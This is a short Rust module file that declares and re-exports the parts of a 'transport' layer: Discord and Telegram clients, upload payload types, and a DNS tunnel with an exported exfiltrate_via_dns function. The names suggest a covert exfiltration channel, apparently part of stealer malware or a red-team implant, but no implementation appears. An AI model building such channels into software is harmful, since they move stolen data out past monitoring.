pub mod client;
pub mod config;
pub mod discord;
pub mod dns;
pub mod errors;
pub mod payload;
pub mod telegram;

pub use client::TransportClient;
pub use config::TransportConfig;
pub use discord::{DiscordClient, DiscordEmbed, DiscordEmbedField};
pub use dns::{exfiltrate_via_dns, DnsEncoding, DnsTunnel, DnsTunnelConfig};
pub use errors::TransportError;
pub use payload::{UploadRequest, UploadResponse};
pub use telegram::TelegramClient;
